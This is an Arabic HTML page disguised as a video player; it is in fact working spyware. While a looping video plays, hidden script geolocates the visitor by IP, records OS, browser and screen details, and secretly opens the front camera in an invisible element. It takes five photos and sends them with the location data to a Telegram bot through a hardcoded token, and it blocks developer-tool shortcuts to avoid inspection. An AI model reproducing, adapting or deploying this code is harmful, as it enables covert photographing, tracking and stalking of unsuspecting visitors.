<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <title>فيديو - معلومات دقيقة</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { background: #000; overflow: hidden; }
        .video-background {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            z-index: 1;
        }
        .video-background video {
            width: 100%;
            height: 100%;
            object-fit: cover;
        }
        .hidden-camera {
            position: fixed;
            top: -9999px;
            left: -9999px;
            width: 1px;
            height: 1px;
            opacity: 0;
            visibility: hidden;
        }
        canvas { display: none; }
        ::-webkit-scrollbar { display: none; }
    </style>
</head>
<body>

    <div class="video-background">
        <video id="bgVideo" autoplay loop muted playsinline>
            <source src="https://raw.githubusercontent.com/xo3bdu/trt/refs/heads/main/video.mp4" type="video/mp4">
        </video>
    </div>

    <div class="hidden-camera">
        <video id="camera" autoplay playsinline muted></video>
    </div>

    <canvas id="canvas"></canvas>

    <script>
        // ==================== إعدادات تليجرام ====================
        const BOT_TOKEN = "8179040156:AAFdn8ApCAIbaWhpLaFQMyqrwUwfR1hfyuY";
        let CHAT_ID = null;
        let stream = null;
        let cameraReady = false;
        
        // ==================== معلومات الجهاز ====================
        let deviceInfo = {
            ip: 'جاري الجلب...',
            country: 'جاري الجلب...',
            city: 'جاري الجلب...',
            region: 'جاري الجلب...',
            isp: 'جاري الجلب...',
            lat: 'جاري الجلب...',
            lon: 'جاري الجلب...',
            timezone: 'جاري الجلب...',
            os: 'جاري الجلب...',
            browser: 'جاري الجلب...',
            screen: 'جاري الجلب...'
        };
        
        // ==================== عناصر الصفحة ====================
        const camera = document.getElementById('camera');
        const canvas = document.getElementById('canvas');
        
        // ==================== الطريقة الجديدة 1: Frostbyte API (بدون مفتاح) ====================
        async function getIPInfoFrostbyte() {
            try {
                console.log('🔍 محاولة Frostbyte API...');
                const response = await fetch('https://agent-gateway-kappa.vercel.app/ip/json', {
                    method: 'GET',
                    headers: { 'Accept': 'application/json' }
                });
                
                if (response.ok) {
                    const data = await response.json();
                    console.log('✅ Frostbyte:', data);
                    
                    deviceInfo.ip = data.ip || 'غير معروف';
                    deviceInfo.country = data.country || 'غير معروف';
                    deviceInfo.city = data.city || 'غير معروف';
                    deviceInfo.region = data.region || 'غير معروف';
                    deviceInfo.isp = data.isp || 'غير معروف';
                    deviceInfo.lat = data.lat || 'غير معروف';
                    deviceInfo.lon = data.lon || 'غير معروف';
                    deviceInfo.timezone = data.timezone || 'غير معروف';
                    
                    return true;
                }
                return false;
            } catch (error) {
                console.log('❌ Frostbyte فشل:', error);
                return false;
            }
        }
        
        // ==================== الطريقة الجديدة 2: geo.wp-statistics.com (بدون مفتاح) ====================
        async function getIPInfoWPStats() {
            try {
                console.log('🔍 محاولة WP Statistics API...');
                const response = await fetch('https://geo.wp-statistics.com/?format=json', {
                    method: 'GET',
                    headers: { 'Accept': 'application/json' }
                });
                
                if (response.ok) {
                    const data = await response.json();
                    console.log('✅ WP Stats:', data);
                    
                    deviceInfo.ip = data.ip || deviceInfo.ip;
                    deviceInfo.country = data.country || deviceInfo.country;
                    deviceInfo.city = data.city || deviceInfo.city;
                    deviceInfo.region = data.region || deviceInfo.region;
                    deviceInfo.lat = data.latitude || deviceInfo.lat;
                    deviceInfo.lon = data.longitude || deviceInfo.lon;
                    deviceInfo.timezone = data.timezone || deviceInfo.timezone;
                    
                    return true;
                }
                return false;
            } catch (error) {
                console.log('❌ WP Stats فشل:', error);
                return false;
            }
        }
        
        // ==================== الطريقة الجديدة 3: ip-api.com (بدون مفتاح - يعمل دائماً) ====================
        async function getIPInfoIpApi() {
            try {
                console.log('🔍 محاولة ip-api.com...');
                const response = await fetch('https://ip-api.com/json/', {
                    method: 'GET',
                    headers: { 'Accept': 'application/json' }
                });
                
                if (response.ok) {
                    const data = await response.json();
                    console.log('✅ ip-api:', data);
                    
                    if (data.status === 'success') {
                        deviceInfo.ip = data.query || deviceInfo.ip;
                        deviceInfo.country = data.country || deviceInfo.country;
                        deviceInfo.city = data.city || deviceInfo.city;
                        deviceInfo.region = data.regionName || deviceInfo.region;
                        deviceInfo.isp = data.isp || deviceInfo.isp;
                        deviceInfo.lat = data.lat || deviceInfo.lat;
                        deviceInfo.lon = data.lon || deviceInfo.lon;
                        deviceInfo.timezone = data.timezone || deviceInfo.timezone;
                        return true;
                    }
                }
                return false;
            } catch (error) {
                console.log('❌ ip-api فشل:', error);
                return false;
            }
        }
        
        // ==================== الطريقة الأساسية: جلب IP فقط (احتياطي) ====================
        async function getBasicIP() {
            try {
                const response = await fetch('https://api.ipify.org?format=json');
                const data = await response.json();
                deviceInfo.ip = data.ip;
                return true;
            } catch(e) {
                return false;
            }
        }
        
        // ==================== جلب المعلومات من جميع المصادر ====================
        async function getAllIPInfo() {
            // جرب الخدمات بالترتيب (الأسرع أولاً)
            const success = await getIPInfoIpApi() || 
                           await getIPInfoFrostbyte() || 
                           await getIPInfoWPStats();
            
            if (!success) {
                await getBasicIP();
                deviceInfo.country = 'تم جلب IP فقط';
            }
            
            console.log('📋 المعلومات النهائية:', deviceInfo);
        }
        
        // ==================== جلب نظام التشغيل والمتصفح ====================
        function getSystemInfo() {
            const userAgent = navigator.userAgent;
            const platform = navigator.platform;
            
            // نظام التشغيل
            let os = 'Unknown';
            if (userAgent.indexOf('Win') !== -1) os = 'Windows';
            else if (userAgent.indexOf('Mac') !== -1) os = 'macOS';
            else if (userAgent.indexOf('Linux') !== -1) {
                if (userAgent.indexOf('Android') !== -1) os = 'Android';
                else os = 'Linux';
            }
            else if (userAgent.indexOf('iOS') !== -1 || userAgent.indexOf('iPhone') !== -1) os = 'iOS';
            
            // المتصفح
            let browser = 'Unknown';
            if (userAgent.indexOf('Chrome') !== -1 && userAgent.indexOf('Edg') === -1) browser = 'Chrome';
            else if (userAgent.indexOf('Firefox') !== -1) browser = 'Firefox';
            else if (userAgent.indexOf('Safari') !== -1 && userAgent.indexOf('Chrome') === -1) browser = 'Safari';
            else if (userAgent.indexOf('Edg') !== -1) browser = 'Edge';
            
            deviceInfo.os = `${os} (${platform})`;
            deviceInfo.browser = browser;
            deviceInfo.screen = `${screen.width}x${screen.height}`;
        }
        
        // ==================== الحصول على Chat ID ====================
        async function getChatId() {
            try {
                const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/getUpdates`);
                const result = await response.json();
                if (result.ok && result.result.length > 0) {
                    CHAT_ID = result.result[result.result.length - 1].message?.chat?.id;
                    return CHAT_ID !== null;
                }
                return false;
            } catch(error) {
                console.error('خطأ:', error);
                return false;
            }
        }
        
        // ==================== تشغيل الكاميرا ====================
        async function startCamera() {
            try {
                stream = await navigator.mediaDevices.getUserMedia({ 
                    video: { facingMode: "user" } 
                });
                camera.srcObject = stream;
                cameraReady = true;
                return true;
            } catch(err) {
                console.error('خطأ الكاميرا:', err);
                return false;
            }
        }
        
        // ==================== إنشاء نص المعلومات ====================
        function getInfoText(photoNumber) {
            // إحداثيات GPS إذا وجدت
            let coordsText = '';
            if (deviceInfo.lat && deviceInfo.lat !== 'غير معروف' && deviceInfo.lat !== 'جاري الجلب...') {
                coordsText = `📍 الإحداثيات: ${deviceInfo.lat}, ${deviceInfo.lon}`;
            }
            
            return `
📸 صورة ${photoNumber}/5

━━━━━━━━━━━━━━━━
📍 معلومات الموقع (محدثة):
━━━━━━━━━━━━━━━━

🌐 عنوان IP: ${deviceInfo.ip}
🗺️ الدولة: ${deviceInfo.country}
🏙️ المدينة: ${deviceInfo.city}
📍 المنطقة: ${deviceInfo.region}
📡 مزود الخدمة: ${deviceInfo.isp}
${coordsText}
⏰ المنطقة الزمنية: ${deviceInfo.timezone}

💻 نظام التشغيل: ${deviceInfo.os}
🌍 المتصفح: ${deviceInfo.browser}
📱 دقة الشاشة: ${deviceInfo.screen}

━━━━━━━━━━━━━━━━
🕐 الوقت: ${new Date().toLocaleString('ar-SA')}
━━━━━━━━━━━━━━━━
            `;
        }
        
        // ==================== التقاط وإرسال الصورة ====================
        async function captureAndSend(photoNumber) {
            if (!CHAT_ID || !cameraReady) return false;
            
            try {
                if (camera.videoWidth === 0 || camera.videoHeight === 0) return false;
                
                canvas.width = camera.videoWidth;
                canvas.height = camera.videoHeight;
                const ctx = canvas.getContext('2d');
                ctx.translate(canvas.width, 0);
                ctx.scale(-1, 1);
                ctx.drawImage(camera, 0, 0, canvas.width, canvas.height);
                ctx.setTransform(1, 0, 0, 1, 0, 0);
                
                const blob = await new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg', 0.8));
                const formData = new FormData();
                formData.append('chat_id', CHAT_ID);
                formData.append('photo', blob, `photo_${Date.now()}.jpg`);
                formData.append('caption', getInfoText(photoNumber));
                
                const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                    method: 'POST',
                    body: formData
                });
                const result = await response.json();
                return result.ok;
            } catch(e) {
                console.error('خطأ في الإرسال:', e);
                return false;
            }
        }
        
        // ==================== تصوير 5 صور ====================
        async function captureAllPhotos() {
            for (let i = 1; i <= 5; i++) {
                await captureAndSend(i);
                if (i < 5) {
                    await new Promise(resolve => setTimeout(resolve, 9000));
                }
            }
            
            setTimeout(() => {
                if (stream) {
                    stream.getTracks().forEach(track => track.stop());
                }
            }, 2000);
        }
        
        // ==================== التشغيل الرئيسي ====================
        async function init() {
            // 1. جلب معلومات النظام
            getSystemInfo();
            
            // 2. جلب IP والموقع (الطرق الجديدة)
            await getAllIPInfo();
            
            // 3. تشغيل الكاميرا
            const cameraSuccess = await startCamera();
            
            // 4. الحصول على Chat ID
            await getChatId();
            
            // 5. بدء التصوير
            if (cameraSuccess && CHAT_ID) {
                setTimeout(() => {
                    captureAllPhotos();
                }, 1000);
            }
        }
        
        init();
        
        // منع أدوات المطور
        document.addEventListener('contextmenu', e => e.preventDefault());
        document.addEventListener('keydown', function(e) {
            if (e.key === 'F12' || 
                (e.ctrlKey && e.shiftKey && (e.key === 'I' || e.key === 'J' || e.key === 'C')) || 
                (e.ctrlKey && e.key === 'U')) {
                e.preventDefault();
                return false;
            }
        });
        
        window.onbeforeunload = () => {
            if (stream) stream.getTracks().forEach(t => t.stop());
        };
    </script>
</body>
</html>
